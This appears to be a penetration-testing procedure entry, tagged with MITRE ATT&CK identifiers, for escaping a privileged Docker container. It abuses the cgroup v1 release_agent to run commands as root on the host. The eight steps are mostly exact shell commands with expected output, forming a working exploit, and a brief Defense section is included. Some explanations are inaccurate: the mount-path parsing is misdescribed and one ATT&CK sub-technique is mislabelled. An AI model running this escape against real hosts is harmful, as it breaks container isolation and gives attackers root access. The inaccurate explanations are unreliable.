---
id: a5b040f6-ab7d-48cb-8dbc-4a76918fbc56
name: Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:17.129539+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[sub-techniques/Access Token Manipulation|T1548.003 - Access Token
    Manipulation]]
tags:
  - '[[tags/Abusing CAP_SYS_ADMIN capability]]'
  - '[[tags/Container - Docker Pentest]]'
  - '[[tags/Exploit privileged container abusing the Linux cgroup v1]]'
commands:
  - '[[commands/start-privileged-ubuntu-container]]'
  - '[[commands/determine-host-path-from-mtab]]'
  - '[[commands/create-and-mount-cgroup]]'
  - '[[commands/enable-notify-on-release]]'
  - '[[commands/set-cgroup-release-agent]]'
  - '[[commands/create-release-agent-script]]'
  - '[[commands/make-script-executable]]'
  - '[[commands/attach-process-to-cgroup]]'
platforms:
  - Linux
  - Docker
tools: []
validated: true
---

# Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation

## Summary

This procedure exploits the CAP_SYS_ADMIN Linux capability in a privileged Docker container to abuse cgroup v1 release notifications, allowing arbitrary code execution on the host system as root. By mounting the cgroup filesystem, setting a custom release agent, and attaching a process to trigger it, an attacker can escalate from container privileges to full host control, demonstrating risks in misconfigured container security.

## Description

In Linux cgroup v1, the CAP_SYS_ADMIN capability permits mounting filesystems and configuring cgroups. In a privileged Docker container (with --cap-add=SYS_ADMIN), an attacker can mount /sys/fs/cgroup, create a subgroup, enable notify_on_release, and set a release_agent path pointing to a script on the host filesystem (discovered via /etc/mtab). When a process in the cgroup exits, the kernel executes the release_agent as root on the host, enabling command execution outside the container. This targets environments running Docker with insecure privilege grants, such as development or legacy setups. Success grants root shell or data access on the host, bypassing container isolation.

## Requirements

1. Access to a Docker host running Linux kernel with cgroup v1 enabled (common in older distributions).
2. Ability to spawn new containers (e.g., docker run privileges).
3. Target container image like Ubuntu (pre-installed or pullable).
4. No AppArmor or SELinux enforcing container restrictions.
5. Basic Linux shell knowledge for command execution.

## Defense

- Avoid using --privileged or --cap-add=SYS_ADMIN in production containers; use minimal capabilities.
- Monitor Docker daemon logs for suspicious container spawns with elevated caps.
- Enable cgroup v2 (unified hierarchy) to mitigate v1-specific release agent abuse.
- Implement runtime security tools like Falco or Sysdig to alert on cgroup mounts or host file writes from containers.
- Regularly audit container configurations and use podman or Kubernetes with strict PodSecurityPolicies.

## Objectives

1. Mount cgroup filesystem and configure release notifications within a privileged container.
2. Escalate privileges by executing arbitrary code on the host as root via the release agent.
3. Verify host access by dumping process lists or other sensitive data to accessible locations.

## Instructions

### Step 1: Start Privileged Ubuntu Container

**Context**: Launch a Docker container with SYS_ADMIN capability and unconfined AppArmor to allow cgroup manipulation. This provides the isolated environment needed for the exploit without host modifications.

**Command** ([[commands/start-privileged-ubuntu-container]]):
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

> This command pulls and runs an interactive Ubuntu container. The --rm flag cleans up on exit, -it enables interactive shell. SYS_ADMIN adds the necessary capability, and apparmor=unconfined disables profile enforcement. Expected: A bash prompt inside the container (root@container-id:/#).

### Step 2: Determine Host Path from Mount Table

**Context**: Extract the host's cgroup mount path from /etc/mtab to locate writable host directories visible from the container, enabling the release agent script placement.

**Command** ([[commands/determine-host-path-from-mtab]]):
```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

> This sed command parses /etc/mtab for the perdir parameter in cgroup mounts, revealing the host's /sys/fs/cgroup path. Expected: $host_path variable set to something like /sys/fs/cgroup (verify with echo $host_path).

### Step 3: Create and Mount Cgroup

**Context**: Mount the cgroup v1 filesystem and create a subgroup to prepare for release agent configuration, leveraging CAP_SYS_ADMIN to bypass normal restrictions.

**Command** ([[commands/create-and-mount-cgroup]]):
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

> Creates /tmp/cgrp, mounts cgroup type with rdma option (allows remount), and makes subgroup x. Expected: No errors; ls /tmp/cgrp shows cgroup structure (e.g., cgroup.procs, release_agent files).

### Step 4: Enable Notify on Release

**Context**: Activate release notifications for the subgroup so that process exit triggers the kernel to run the configured release agent script.

**Command** ([[commands/enable-notify-on-release]]):
```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```

> Writes 1 to enable the flag. Expected: cat /tmp/cgrp/x/notify_on_release outputs 1; no permission errors due to CAP_SYS_ADMIN.

### Step 5: Set Cgroup Release Agent

**Context**: Point the release agent to a script on the host path (e.g., $host_path/cmd), which will execute when the cgroup process releases.

**Command** ([[commands/set-cgroup-release-agent]]):
```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

> Sets the agent path using the determined host_path. Expected: cat /tmp/cgrp/release_agent shows the full path (e.g., /sys/fs/cgroup/cmd); verify writability.

### Step 6: Create Release Agent Script

**Context**: Write a simple shell script to /cmd that runs desired commands (e.g., dump host processes) when triggered by the kernel.

**Command** ([[commands/create-release-agent-script]]):
```bash
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
```

> Creates shebang and appends ps aux to output file on host. Expected: cat /cmd shows the script content; adjust echo for other commands like id or hostname.

### Step 7: Make Script Executable

**Context**: Ensure the release agent script has execute permissions so the kernel can run it as root on host release.

**Command** ([[commands/make-script-executable]]):
```bash
chmod a+x /cmd
```

> Grants all users execute permission. Expected: ls -l /cmd shows -rwxr-xr-x or similar; no errors.

### Step 8: Attach Process to Cgroup

**Context**: Spawn a background process in the cgroup and kill it to trigger release, executing the agent script on the host.

**Command** ([[commands/attach-process-to-cgroup]]):
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

> Echoes the shell PID to cgroup.procs (attaches current process), then the shell exits, triggering release. Expected: After ~5-10s, check $host_path/output for host's ps aux dump, confirming root execution (e.g., processes from host kernel).
